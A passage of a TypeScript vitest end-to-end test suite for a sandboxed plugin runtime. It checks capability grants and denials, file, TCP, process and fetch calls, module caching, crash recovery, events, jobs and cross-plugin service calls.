/**
 * vNext Runtime service end-to-end (Stage A, ADR-0027 §3).
 *
 * Full stack through the REAL subprocess runtime: a plugin package on disk →
 * host-side signed graph → WORKER_SPAWN → MODULE_GRAPH frames → SES worker →
 * broker calls decided by the production Main Host policy against real DB
 * grants → worker-side promises settle. Pins the M1 prototype goals:
 * no Node authority in the worker, host-authoritative denial, worker
 * lifecycle and runtime shutdown.
 */
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createAppDatabase, type AppDatabase } from '@neotavern/db';
import { AppError } from '@neotavern/shared';
import { createVNextRuntimeService, type VNextRuntimeService } from '../src/plugin/vnextRuntime.js';
import type { VNextBrokerHost } from '../src/plugin/vnextBroker.js';

const ROUNDTRIP_PLUGIN_ID = 'test.vnext.roundtrip';
const DENIED_PLUGIN_ID = 'test.vnext.denied';
const BOOM_PLUGIN_ID = 'test.vnext.boom';
const BIG_PLUGIN_ID = 'test.vnext.biggraph';
const FILES_PLUGIN_ID = 'test.vnext.files';
const NET_PLUGIN_ID = 'test.vnext.net';
const PROC_PLUGIN_ID = 'test.vnext.proc';

const ROUNDTRIP_ENTRY = [
  'export let result;',
  "bridge.invoke('storage.kv.set', { key: 'greeting', value: { text: 'hello' } }, { capability: 'storage.kv' })",
  "  .then(() => bridge.invoke('storage.kv.get', { key: 'greeting' }, { capability: 'storage.kv' }))",
  '  .then((value) => { result = value; });',
].join('\n');

const DENIED_ENTRY = [
  'export let error;',
  "bridge.invoke('storage.kv.get', { key: 'secret' }, { capability: 'storage.kv' })",
  '  .then(undefined, (err) => { error = { code: err.code, message: err.message }; });',
].join('\n');

const BOOM_ENTRY = "throw new Error('boom');\n";

const FILES_ENTRY = [
  'export let result;',
  "sdk.files.write('notes/a.txt', 'hello from worker')",
  "  .then(() => sdk.files.read('notes/a.txt'))",
  "  .then((value) => sdk.files.stat('notes/a.txt').then((stat) => ({ value, stat })))",
  '  .then((out) => { result = out; });',
].join('\n');

/** TCP round-trip against an echo server; PORT is substituted per test. */
function netEntry(port: number): string {
  return [
    'export let result;',
    `sdk.network.tcp.connect('127.0.0.1', ${port})`,
    "  .then((handle) => sdk.network.tcp.send(handle.id, 'wire ping').then(() => handle))",
    '  .then((handle) => sdk.network.tcp.receive(handle.id, { waitMs: 2000 }).then((out) => ({ handle, out })))',
    '  .then(({ handle, out }) => sdk.network.tcp.close(handle.id).then(() => out))',
    '  .then((out) => { result = out; });',
  ].join('\n');
}

/** Spawn a child node process; EXECUTABLE is substituted per test. */
function procEntry(executable: string): string {
  return [
    'export let result;',
    `sdk.process.spawn({ executable: ${JSON.stringify(executable)}, args: ['-e', 'console.log(\\'child-ok\\')'] })`,
    '  .then((handle) => { const id = handle.id; return sdk.process.output(id, { waitMs: 3000 }).then((out) => sdk.process.wait(id, { waitMs: 3000 }).then((waited) => ({ out, waited }))); })',
    '  .then(({ out, waited }) => { result = { stdout: out.stdout, exitCode: waited.exitCode }; });',
  ].join('\n');
}

let database: AppDatabase;
let runtime: VNextRuntimeService;
let tempRoot: string;
const runtimeStderr: string[] = [];
/** §9.1.1 host log router capture (batched LOG_BATCH frames). */
const logEntries: Array<{
  workerId: number;
  pluginId: string;
  level: string;
  message: string;
  count?: number;
  suppressed?: number;
}> = [];

function writePluginPackage(pluginId: string, entry: string): string {
  const root = join(tempRoot, pluginId);
  mkdirSync(join(root, 'src'), { recursive: true });
  writeFileSync(
    join(root, 'plugin.json'),
    JSON.stringify({
      id: pluginId,
      name: pluginId,
      version: '1.0.0',
      apiVersion: 3,
      backend: 'src/index.js',
      requiredCapabilities: [{ name: 'storage.kv', ops: ['get', 'set'] }],
    }),
  );
  writeFileSync(join(root, 'src', 'index.js'), entry);
  // The grants table has a FK to the plugin registry: install the row so
  // `capabilityGrants.grant` can reference it.
  database.repos.plugins.install({
    id: pluginId,
    name: pluginId,
    version: '1.0.0',
    manifest: { apiVersion: 3, backend: 'src/index.js' },
    requestedPermissions: ['storage.kv'],
  });
  return root;
}

beforeEach(async () => {
  database = createAppDatabase(':memory:');
  tempRoot = mkdtempSync(join(tmpdir(), 'neotavern-vnext-runtime-'));
  writePluginPackage(ROUNDTRIP_PLUGIN_ID, ROUNDTRIP_ENTRY);
  writePluginPackage(DENIED_PLUGIN_ID, DENIED_ENTRY);
  writePluginPackage(BOOM_PLUGIN_ID, BOOM_ENTRY);
  writePluginPackage(FILES_PLUGIN_ID, FILES_ENTRY);
  // The net plugin entry is port-dependent; written by the socket test.
  runtimeStderr.length = 0;
  logEntries.length = 0;
  const ctx = {
    database,
    providers: undefined,
    config: {
      providerTimeouts: { connectMs: 1000, idleMs: 1000, readMs: 1000 },
    },
  } as unknown as VNextBrokerHost;
  runtime = createVNextRuntimeService(ctx, {
    stderrSink: (line) => {
      runtimeStderr.push(line);
    },
    timeoutMs: 15000,
    logSink: (entry) => logEntries.push(entry),
    // §30 Files API: plugin data lives in a per-plugin temp dir in tests.
    filesRoot: (pluginId) => join(tempRoot, pluginId, 'data'),
  });
});

afterEach(async () => {
  await runtime.shutdown().catch(() => undefined);
  rmSync(tempRoot, { recursive: true, force: true });
});

describe('vNext runtime service (Stage A)', () => {
  it(
    'activates a v3 plugin from disk, round-trips a broker call, deactivates',
    { timeout: 60000 },
    async () => {
      database.repos.capabilityGrants.grant({
        pluginId: ROUNDTRIP_PLUGIN_ID,
        name: 'storage.kv',
        scope: {},
      });

      const info = await runtime.activate({
        pluginId: ROUNDTRIP_PLUGIN_ID,
        installationId: `${ROUNDTRIP_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, ROUNDTRIP_PLUGIN_ID),
        entry: 'src/index.js',
        trustLevel: 'sandbox',
      });

      // M1: the worker has no Node authority (§ ADR-0028).
      expect(info.noNodeAuthority).toBe(true);
      expect(info.exportNames).toEqual(['result']);
      // The import-time broker call was decided in Main Host and the
      // worker-side promise settled with the stored value.
      expect(info.snapshot).toEqual({ result: { value: { text: 'hello' } } });
      expect(runtime.isActive(ROUNDTRIP_PLUGIN_ID)).toBe(true);

      await runtime.deactivate(ROUNDTRIP_PLUGIN_ID);
      expect(runtime.isActive(ROUNDTRIP_PLUGIN_ID)).toBe(false);
    },
  );

  it(
    'activates a plugin whose sdk.files calls land in its own data directory (§30)',
    { timeout: 60000 },
    async () => {
      database.repos.capabilityGrants.grant({
        pluginId: FILES_PLUGIN_ID,
        name: 'files.plugin',
        scope: {},
      });

      const info = await runtime.activate({
        pluginId: FILES_PLUGIN_ID,
        installationId: `${FILES_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, FILES_PLUGIN_ID),
        entry: 'src/index.js',
        trustLevel: 'sandbox',
      });

      expect(info.snapshot).toEqual({
        result: { value: { content: 'hello from worker' }, stat: { kind: 'file', size: 17 } },
      });
      // The file landed inside the plugin's own data directory, on disk.
      const onDisk = readFileSync(
        join(tempRoot, FILES_PLUGIN_ID, 'data', 'notes', 'a.txt'),
        'utf8',
      );
      expect(onDisk).toBe('hello from worker');

      await runtime.deactivate(FILES_PLUGIN_ID);
    },
  );

  it(
    'round-trips a tcp socket through the full wire (sdk → runtime → broker → host) (§29)',
    { timeout: 60000 },
    async () => {
      const server = createServer((socket) => {
        socket.on('data', (chunk) => socket.write(chunk));
      });
      await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
      const port = (server.address() as { port: number }).port;
      try {
        writePluginPackage(NET_PLUGIN_ID, netEntry(port));
        database.repos.capabilityGrants.grant({
          pluginId: NET_PLUGIN_ID,
          name: 'network.tcp',
          scope: {},
        });
        database.repos.capabilityGrants.grant({
          pluginId: NET_PLUGIN_ID,
          name: 'network.local',
          scope: {},
        });

        const info = await runtime.activate({
          pluginId: NET_PLUGIN_ID,
          installationId: `${NET_PLUGIN_ID}@1.0.0`,
          packageRoot: join(tempRoot, NET_PLUGIN_ID),
          entry: 'src/index.js',
          trustLevel: 'sandbox',
        });
        expect(info.snapshot).toEqual({
          result: { messages: ['wire ping'], closed: false },
        });
        await runtime.deactivate(NET_PLUGIN_ID);
      } finally {
        await new Promise((resolve) => server.close(resolve));
      }
    },
  );

  it(
    'spawns a scoped child process through the full wire (sdk → runtime → broker → host) (§32)',
    { timeout: 60000 },
    async () => {
      const executable = process.execPath.replace(/\\/g, '/');
      writePluginPackage(PROC_PLUGIN_ID, procEntry(executable));
      database.repos.capabilityGrants.grant({
        pluginId: PROC_PLUGIN_ID,
        name: 'process.spawn',
        scope: {},
      });

      const info = await runtime.activate({
        pluginId: PROC_PLUGIN_ID,
        installationId: `${PROC_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, PROC_PLUGIN_ID),
        entry: 'src/index.js',
        trustLevel: 'sandbox',
      });
      expect(info.snapshot).toEqual({
        result: { stdout: ['child-ok\n'], exitCode: 0 },
      });
      await runtime.deactivate(PROC_PLUGIN_ID);
    },
  );

  it(
    'spawns workers under the emergency ceiling from hint/override (§22/§38/§39)',
    { timeout: 60000 },
    async () => {
      database.repos.capabilityGrants.grant({
        pluginId: ROUNDTRIP_PLUGIN_ID,
        name: 'storage.kv',
        scope: {},
      });

      // Admin override wins over the headroom calculation and is reported
      // back through the full stack (manifest spec → WORKER_SPAWN → runtime →
      // supervisor → bootstrap → hardened-ready → WORKER_READY).
      const overridden = await runtime.activate({
        pluginId: ROUNDTRIP_PLUGIN_ID,
        installationId: `${ROUNDTRIP_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, ROUNDTRIP_PLUGIN_ID),
        entry: 'src/index.js',
        maxHeapOverrideMiB: 768,
      });
      expect(overridden.emergencyLimits).toEqual({
        maxOldGenerationSizeMb: 768,
        maxYoungGenerationSizeMb: 192,
      });
      await runtime.deactivate(ROUNDTRIP_PLUGIN_ID);

      // The memory hint raises the emergency ceiling toward the declared
      // need when headroom permits — the ceiling is never below the hint.
      const hinted = await runtime.activate({
        pluginId: ROUNDTRIP_PLUGIN_ID,
        installationId: `${ROUNDTRIP_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, ROUNDTRIP_PLUGIN_ID),
        entry: 'src/index.js',
        memoryHintMiB: 2048,
      });
      expect(hinted.emergencyLimits?.maxOldGenerationSizeMb).toBeGreaterThanOrEqual(2048);
      await runtime.deactivate(ROUNDTRIP_PLUGIN_ID);
    },
  );

  it(
    'persists built module maps on disk and reuses them across activations (§8.1)',
    { timeout: 60000 },
    async () => {
      database.repos.capabilityGrants.grant({
        pluginId: ROUNDTRIP_PLUGIN_ID,
        name: 'storage.kv',
        scope: {},
      });
      const cacheRoot = join(tempRoot, 'module-map-cache');
      const cachedRuntime = createVNextRuntimeService(
        {
          database,
          providers: undefined,
          config: { providerTimeouts: { connectMs: 1000, idleMs: 1000, readMs: 1000 } },
        } as unknown as VNextBrokerHost,
        {
          stderrSink: (line) => runtimeStderr.push(line),
          timeoutMs: 15000,
          moduleMapCacheDir: cacheRoot,
        },
      );

      const spec = {
        pluginId: ROUNDTRIP_PLUGIN_ID,
        installationId: `${ROUNDTRIP_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, ROUNDTRIP_PLUGIN_ID),
        entry: 'src/index.js',
      } as const;
      try {
        const first = await cachedRuntime.activate(spec);
        expect(first.snapshot).toEqual({ result: { value: { text: 'hello' } } });
        // One entry for the unchanged source.
        expect(readdirSync(cacheRoot).length).toBe(1);
        await cachedRuntime.deactivate(ROUNDTRIP_PLUGIN_ID);

        // Second activation with unchanged source: the cached graph is used
        // (same digest, same entry count — no new file).
        const second = await cachedRuntime.activate(spec);
        expect(second.snapshot).toEqual({ result: { value: { text: 'hello' } } });
        expect(second.graphDigest).toBe(first.graphDigest);
        expect(readdirSync(cacheRoot).length).toBe(1);
        await cachedRuntime.deactivate(ROUNDTRIP_PLUGIN_ID);

        // Source change → a different key → a second cached entry.
        writeFileSync(
          join(tempRoot, ROUNDTRIP_PLUGIN_ID, 'src', 'index.js'),
          [
            'export let result;',
            "bridge.invoke('storage.kv.get', { key: 'greeting' }, { capability: 'storage.kv' })",
            '  .then((value) => { result = value; });',
          ].join('\n'),
        );
        const changed = await cachedRuntime.activate(spec);
        expect(changed.snapshot).toEqual({ result: { value: { text: 'hello' } } });
        expect(readdirSync(cacheRoot).length).toBe(2);
        await cachedRuntime.deactivate(ROUNDTRIP_PLUGIN_ID);
      } finally {
        await cachedRuntime.shutdown().catch(() => undefined);
      }
    },
  );

  it(
    'activates a plugin whose module graph exceeds the control frame (data pipe)',
    { timeout: 60000 },
    async () => {
      // ~60 KiB source: above the control path's per-string bound, so the
      // signed graph must travel the data pipe (fd 3, §15.9). A successful
      // full-stack activation proves the whole data-pipe path: host →
      // runtime fd 3 → worker bridge port → SES compartment → snapshot.
      const entry = [
        `const pad = ${JSON.stringify('x'.repeat(60 * 1024))};`,
        "export const marker = { padLength: pad.length, via: 'data-pipe' };",
      ].join('\n');
      writePluginPackage(BIG_PLUGIN_ID, entry);

      const info = await runtime.activate({
        pluginId: BIG_PLUGIN_ID,
        installationId: `${BIG_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, BIG_PLUGIN_ID),
        entry: 'src/index.js',
      });
      expect(info.noNodeAuthority).toBe(true);
      expect(info.exportNames).toEqual(['marker']);
      expect(info.snapshot).toEqual({ marker: { padLength: 60 * 1024, via: 'data-pipe' } });
      await runtime.deactivate(BIG_PLUGIN_ID);
    },
  );

  it(
    'delivers a host-side capability denial through the full stack',
    { timeout: 60000 },
    async () => {
      // No grant issued for the plugin: the broker must deny the call.
      const info = await runtime.activate({
        pluginId: DENIED_PLUGIN_ID,
        installationId: `${DENIED_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, DENIED_PLUGIN_ID),
        entry: 'src/index.js',
      });
      expect(info.noNodeAuthority).toBe(true);
      const error = info.snapshot['error'] as { code?: string };
      expect(error.code).toBe('CAPABILITY_DENIED');
    },
  );

  it(
    'rejects activation when the entry module evaluation fails and cleans up the worker',
    { timeout: 60000 },
    async () => {
      const failure = await runtime
        .activate({
          pluginId: BOOM_PLUGIN_ID,
          installationId: `${BOOM_PLUGIN_ID}@1.0.0`,
          packageRoot: join(tempRoot, BOOM_PLUGIN_ID),
          entry: 'src/index.js',
        })
        .then(
          () => null,
          (error: unknown) => error,
        );
      expect(failure).toBeInstanceOf(AppError);
      expect((failure as AppError).code).toBe('PLUGIN_LOAD_FAILED');
      expect((failure as AppError).params).toMatchObject({
        moduleErrorCode: 'MODULE_EVALUATION_FAILED',
      });
      expect(runtime.isActive(BOOM_PLUGIN_ID)).toBe(false);
    },
  );

  it('rejects a second activation while a plugin is active', { timeout: 60000 }, async () => {
    // The plugin must be healthy (capability granted): an import-time broker
    // denial with no rejection handler is Worker-fatal (§26.1.3) — the worker
    // delivers module-graph-loaded and then exits(1), so a second activation
    // would legitimately restart it. This test pins the already-active path.
    database.repos.capabilityGrants.grant({
      pluginId: ROUNDTRIP_PLUGIN_ID,
      name: 'storage.kv',
      scope: {},
    });
    await runtime.activate({
      pluginId: ROUNDTRIP_PLUGIN_ID,
      installationId: `${ROUNDTRIP_PLUGIN_ID}@1.0.0`,
      packageRoot: join(tempRoot, ROUNDTRIP_PLUGIN_ID),
      entry: 'src/index.js',
    });
    await expect(
      runtime.activate({
        pluginId: ROUNDTRIP_PLUGIN_ID,
        installationId: `${ROUNDTRIP_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, ROUNDTRIP_PLUGIN_ID),
        entry: 'src/index.js',
      }),
    ).rejects.toMatchObject({ code: 'PLUGIN_LOAD_FAILED' });
  });

  it('deactivating an unknown plugin is a no-op', async () => {
    await expect(runtime.deactivate('test.vnext.nope')).resolves.toBeUndefined();
  });

  it(
    'shuts the runtime down and lazily restarts it for the next activation',
    { timeout: 60000 },
    async () => {
      await runtime.shutdown();
      expect(runtime.isActive(ROUNDTRIP_PLUGIN_ID)).toBe(false);
      // The service restarts the runtime process on demand.
      const info = await runtime.activate({
        pluginId: ROUNDTRIP_PLUGIN_ID,
        installationId: `${ROUNDTRIP_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, ROUNDTRIP_PLUGIN_ID),
        entry: 'src/index.js',
      });
      expect(info.workerId).toBeGreaterThan(0);
      await runtime.deactivate(ROUNDTRIP_PLUGIN_ID);
    },
  );

  it('logs no protocol errors during the happy path', { timeout: 60000 }, async () => {
    database.repos.capabilityGrants.grant({
      pluginId: ROUNDTRIP_PLUGIN_ID,
      name: 'storage.kv',
      scope: {},
    });
    await runtime.activate({
      pluginId: ROUNDTRIP_PLUGIN_ID,
      installationId: `${ROUNDTRIP_PLUGIN_ID}@1.0.0`,
      packageRoot: join(tempRoot, ROUNDTRIP_PLUGIN_ID),
      entry: 'src/index.js',
    });
    await runtime.deactivate(ROUNDTRIP_PLUGIN_ID);
    await runtime.shutdown();
    const errors = runtimeStderr.filter((line) => line.includes('protocol error'));
    expect(errors).toEqual([]);
  });

  it(
    'recovers from a runtime process crash and reactivates on demand (§20.13)',
    { timeout: 60000 },
    async () => {
      database.repos.capabilityGrants.grant({
        pluginId: ROUNDTRIP_PLUGIN_ID,
        name: 'storage.kv',
        scope: {},
      });
      const info1 = await runtime.activate({
        pluginId: ROUNDTRIP_PLUGIN_ID,
        installationId: `${ROUNDTRIP_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, ROUNDTRIP_PLUGIN_ID),
        entry: 'src/index.js',
      });
      expect(runtime.isActive(ROUNDTRIP_PLUGIN_ID)).toBe(true);

      // The runtime prints its pid on stderr at startup; each generation gets
      // a fresh pid line.
      const runtimePids = (): number[] =>
        runtimeStderr
          .map((line) => line.match(/pid=(\d+)/)?.[1])
          .filter((pid): pid is string => pid !== undefined)
          .map(Number);
      expect(runtimePids().length).toBeGreaterThan(0);
      const generation1 = runtimePids()[0];
      expect(generation1).toBeGreaterThan(0);

      // Crash the runtime process out from under the service.
      process.kill(generation1, 'SIGKILL');

      // §20.13: the host resets worker state and does NOT re-activate any
      // plugin automatically — everything becomes cold.
      const resetDeadline = Date.now() + 8000;
      while (runtime.isActive(ROUNDTRIP_PLUGIN_ID) && Date.now() < resetDeadline) {
        await new Promise((resolve) => setTimeout(resolve, 25));
      }
      expect(runtime.isActive(ROUNDTRIP_PLUGIN_ID)).toBe(false);
      expect(runtime.activePlugins()).toEqual([]);

      // An activation in flight while the runtime dies fails fast with
      // PLUGIN_RUNTIME_CRASHED (its worker died with the process).
      const inFlight = runtime.activate({
        pluginId: ROUNDTRIP_PLUGIN_ID,
        installationId: `${ROUNDTRIP_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, ROUNDTRIP_PLUGIN_ID),
        entry: 'src/index.js',
      });
      const gen2Deadline = Date.now() + 15000;
      while (runtimePids().length < 2 && Date.now() < gen2Deadline) {
        await new Promise((resolve) => setTimeout(resolve, 25));
      }
      expect(runtimePids().length).toBeGreaterThanOrEqual(2);
      process.kill(runtimePids()[1], 'SIGKILL');
      await expect(inFlight).rejects.toMatchObject({ code: 'PLUGIN_RUNTIME_CRASHED' });

      // The next activation starts a fresh generation on demand (no warm
      // restore, no backoff storm — a brand new worker id).
      const info2 = await runtime.activate({
        pluginId: ROUNDTRIP_PLUGIN_ID,
        installationId: `${ROUNDTRIP_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, ROUNDTRIP_PLUGIN_ID),
        entry: 'src/index.js',
      });
      expect(info2.workerId).not.toBe(info1.workerId);
      expect(runtime.isActive(ROUNDTRIP_PLUGIN_ID)).toBe(true);
      await runtime.deactivate(ROUNDTRIP_PLUGIN_ID);
    },
  );
});

describe('vNext runtime service (Stage F live delivery)', () => {
  const LIVE_PLUGIN_ID = 'test.vnext.live';

  const LIVE_ENTRY = [
    'export let result;',
    "sdk.events.subscribe({ name: 'live.tick' }).then((handle) => {",
    '  handle.next().then((first) => {',
    "    sdk.kv.set('live1', first.value).then(() => {",
    "      console.log('LIVE_EVENT_1');",
    '      handle.next().then((second) => {',
    "        sdk.kv.set('live2', second.value).then(() => {",
    "          console.log('LIVE_EVENT_2');",
    '          handle.close();',
    '        });',
    '      });',
    '    });',
    '  });',
    '});',
  ].join('\n');

  /**
   * Wait for a marker through the §9.1.1 host log router (LOG_BATCH frames
   * from the worker's bounded sink → logSink → `logEntries`).
   */
  async function waitForLog(marker: string, deadlineMs = 10000): Promise<void> {
    const deadline = Date.now() + deadlineMs;
    for (;;) {
      if (logEntries.some((entry) => entry.message.includes(marker))) return;
      if (Date.now() >= deadline) {
        throw new Error(`log marker '${marker}' never arrived`);
      }
      await new Promise((resolve) => setTimeout(resolve, 25));
    }
  }

  it(
    'pushes host-emitted events to the worker over the real wire (emit → worker → kv → log)',
    { timeout: 60000 },
    async () => {
      writePluginPackage(LIVE_PLUGIN_ID, LIVE_ENTRY);
      database.repos.capabilityGrants.grant({
        pluginId: LIVE_PLUGIN_ID,
        name: 'storage.kv',
        scope: {},
      });

      await runtime.activate({
        pluginId: LIVE_PLUGIN_ID,
        installationId: `${LIVE_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, LIVE_PLUGIN_ID),
        entry: 'src/index.js',
        trustLevel: 'sandbox',
      });

      // Emit 1: HOST_BRIDGE_MESSAGE frame → runtime → worker control port →
      // iterator resolves → storage.kv.set call host-ward (decided against the
      // real DB grant) → console marker. The marker after kv.set proves the
      // whole round trip settled.
      runtime.emitEvent('live.tick', { n: 1 });
      await waitForLog('LIVE_EVENT_1');

      runtime.emitEvent('live.tick', { n: 2 });
      await waitForLog('LIVE_EVENT_2');

      await runtime.deactivate(LIVE_PLUGIN_ID);
      await runtime.shutdown();
      expect(runtimeStderr.filter((line) => line.includes('protocol error'))).toEqual([]);
      expect(runtimeStderr.filter((line) => line.includes('drop HOST_BRIDGE_MESSAGE'))).toEqual([]);
    },
  );

  it(
    'drops subscriptions when the worker terminates and keeps the runtime alive',
    { timeout: 60000 },
    async () => {
      writePluginPackage(LIVE_PLUGIN_ID, LIVE_ENTRY);
      database.repos.capabilityGrants.grant({
        pluginId: LIVE_PLUGIN_ID,
        name: 'storage.kv',
        scope: {},
      });

      const info = await runtime.activate({
        pluginId: LIVE_PLUGIN_ID,
        installationId: `${LIVE_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, LIVE_PLUGIN_ID),
        entry: 'src/index.js',
      });
      expect(info.workerId).toBeGreaterThan(0);

      runtime.emitEvent('live.tick', { n: 1 });
      await waitForLog('LIVE_EVENT_1');

      // Deactivating terminates the worker; the broker host prunes its
      // subscriptions (workerTerminated), so the next emit routes nowhere.
      await runtime.deactivate(LIVE_PLUGIN_ID);
      const before = logEntries.length;
      runtime.emitEvent('live.tick', { n: 2 });
      await new Promise((resolve) => setTimeout(resolve, 300));
      expect(logEntries.slice(before).filter((e) => e.message.includes('LIVE_EVENT_2'))).toEqual(
        [],
      );
    },
  );

  it(
    'runs scheduled jobs host-side and delivers job-run pushes to the worker (§19/§27)',
    { timeout: 60000 },
    async () => {
      const JOBS_PLUGIN_ID = 'test.vnext.jobs';
      const JOBS_ENTRY = [
        'export let result;',
        'const token = sdk.jobs.onRun((envelope) => {',
        "  console.log('JOB_RUN ' + envelope.name + ' payload=' + (envelope.payload ? envelope.payload.n : '-'));",
        '});',
        "sdk.jobs.register({ name: 'tick', intervalMs: 100, payload: { n: 1 }, onRun: token }).then(",
        '  (handle) => {',
        '    sdk.jobs.list().then((listed) => {',
        '      result = { jobId: handle.jobId, count: listed.jobs.length };',
        "      console.log('JOB_LISTED count=' + listed.jobs.length);",
        '    });',
        '  },',
        "  (error) => { console.log('JOB_FAILED code=' + error.code); },",
        ');',
      ].join('\n');
      writePluginPackage(JOBS_PLUGIN_ID, JOBS_ENTRY);
      database.repos.capabilityGrants.grant({
        pluginId: JOBS_PLUGIN_ID,
        name: 'jobs.background',
        scope: {},
      });

      await runtime.activate({
        pluginId: JOBS_PLUGIN_ID,
        installationId: `${JOBS_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, JOBS_PLUGIN_ID),
        entry: 'src/index.js',
        trustLevel: 'sandbox',
      });

      // The host scheduler fires the 100ms interval and the broker host
      // pushes job-run bridge messages to the owning worker; the callback
      // logs through the §9.1.1 router. waitForLog polls the drained sink
      // because the snapshot predates the first timer fire.
      await waitForLog('JOB_LISTED count=1');
      await waitForLog('JOB_RUN tick payload=1');

      await runtime.deactivate(JOBS_PLUGIN_ID);
    },
  );

  it(
    'routes cross-plugin service calls with cycle detection (§34/§26.2.1)',
    { timeout: 60000 },
    async () => {
      const SVC_PROVIDER_PLUGIN_ID = 'test.vnext.svc.provider';
      const SVC_CALLER_PLUGIN_ID = 'test.vnext.svc.caller';
      const PROVIDER_ENTRY = [
        'export let result;',
        "sdk.services.provide({ name: 'calc', version: '1.0.0', methods: ['double', 'pingBack'] }, (method, args) => {",
        "  if (method === 'double') return Promise.resolve({ value: (args?.n ?? 0) * 2 });",
        "  if (method === 'pingBack') {",
        "    return sdk.services.connect({ name: 'echo', version: '1.0.0', method: 'pong', args: {} })",
        '      .then((r) => ({ ponged: true, nested: r.result }))',
        '      .catch((err) => ({ cycle: err.code }));',
        '  }',
        "  return Promise.reject(Object.assign(new Error('no method'), { code: 'NOT_FOUND' }));",
        '}).then(',
        "  (handle) => { result = handle.serviceId; console.log('SVC_PROVIDED ' + handle.serviceId); },",
        ');',
      ].join('\n');
      const CALLER_ENTRY = [
        'export let result;',
        "sdk.services.provide({ name: 'echo', version: '1.0.0', methods: ['pong'] }, () =>",
        '  Promise.resolve({ echoed: true }),',
        ')',
        "  .then(() => sdk.services.connect({ name: 'calc', version: '1.0.0', method: 'double', args: { n: 21 } }))",
        "  .then((r) => { result = r.result; console.log('SVC_RESULT ' + JSON.stringify(r.result)); })",
        "  .then(() => sdk.services.connect({ name: 'calc', version: '1.0.0', method: 'pingBack', args: {} }))",
        "  .then((r) => { console.log('SVC_CYCLE_RESULT ' + JSON.stringify(r.result)); })",
        "  .catch((err) => { console.log('SVC_FAILED code=' + err.code); });",
      ].join('\n');
      writePluginPackage(SVC_PROVIDER_PLUGIN_ID, PROVIDER_ENTRY);
      writePluginPackage(SVC_CALLER_PLUGIN_ID, CALLER_ENTRY);
      for (const pluginId of [SVC_PROVIDER_PLUGIN_ID, SVC_CALLER_PLUGIN_ID]) {
        database.repos.capabilityGrants.grant({
          pluginId,
          name: 'services.provide',
          scope: {},
        });
        database.repos.capabilityGrants.grant({
          pluginId,
          name: 'services.connect',
          scope: {},
        });
      }

      // Provider first; its provide RPC must land (host registry) before the
      // caller connects — the SVC_PROVIDED log proves registration.
      await runtime.activate({
        pluginId: SVC_PROVIDER_PLUGIN_ID,
        installationId: `${SVC_PROVIDER_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, SVC_PROVIDER_PLUGIN_ID),
        entry: 'src/index.js',
        trustLevel: 'sandbox',
      });
      await waitForLog('SVC_PROVIDED');

      await runtime.activate({
        pluginId: SVC_CALLER_PLUGIN_ID,
        installationId: `${SVC_CALLER_PLUGIN_ID}@1.0.0`,
        packageRoot: join(tempRoot, SVC_CALLER_PLUGIN_ID),
        entry: 'src/index.js',
        trustLevel: 'sandbox',
      });

      // A → B round trip: caller connect → host push → B handler → respond →
      // caller resolution, all through the real wire.
      await waitForLog('SVC_RESULT {"value":42}');
      // A → B → A: B's handler calls back into A's service with chain [A];
      // the host fails fast with SERVICE_CALL_CYCLE and B surfaces it as the
      // method result (B43 deterministic failure, no deadlock).
      await waitForLog('SVC_CYCLE_RESULT {"cycle":"SERVICE_CALL_CYCLE"}');

      await runtime.deactivate(SVC_CALLER_PLUGIN_ID);
      await runtime.deactivate(SVC_PROVIDER_PLUGIN_ID);
    },
  );
});

describe('vNext runtime service (Stage F streaming response bodies)', () => {
  const BIG_FETCH_PLUGIN_ID = 'test.vnext.bigfetch';

  it(
    'delivers a network fetch response larger than the control path over the data pipe',
    { timeout: 60000 },
    async () => {
      // A dedicated service with an injectable fetch: the plugin's import-time
      // call returns a ~100 KiB body, which cannot ride the RPC_RESPONSE
      // control frame (per-string §15.11 bound) — the client must route it as
      // RPC_RESPONSE_DATA over fd 3, and the worker must parse it.
      const body = 'y'.repeat(100 * 1024);
      const bigFetchRuntime = createVNextRuntimeService(
        {
          database,
          providers: undefined,
          config: { providerTimeouts: { connectMs: 1000, idleMs: 1000, readMs: 1000 } },
        } as unknown as VNextBrokerHost,
        {
          stderrSink: (line) => runtimeStderr.push(line),
          timeoutMs: 15000,
          fetchImpl: async () =>
            new Response(body, {
              status: 200,
              statusText: 'OK',
              headers: { 'content-type': 'text/plain' },
            }),
          // SSRF policy resolves the hostname; a public IP satisfies it.
          dnsLookupImpl: async () => ['93.184.216.34'],
        },
      );

      try {
        writePluginPackage(
          BIG_FETCH_PLUGIN_ID,
          [
            'export let result;',
            "sdk.network.fetch('https://example.com/big')",
            '  .then((r) => { result = { status: r.status, bodyLength: r.body.length, head: r.body.slice(0, 4) }; });',
          ].join('\n'),
        );
        database.repos.capabilityGrants.grant({
          pluginId: BIG_FETCH_PLUGIN_ID,
          name: 'network.http',
          scope: {},
        });

        const info = await bigFetchRuntime.activate({
          pluginId: BIG_FETCH_PLUGIN_ID,
          installationId: `${BIG_FETCH_PLUGIN_ID}@1.0.0`,
          packageRoot: join(tempRoot, BIG_FETCH_PLUGIN_ID),
          entry: 'src/index.js',
          trustLevel: 'sandbox',
        });
        expect(info.noNodeAuthority).toBe(true);
        expect(info.snapshot).toEqual({
          result: { status: 200, bodyLength: 100 * 1024, head: 'yyyy' },
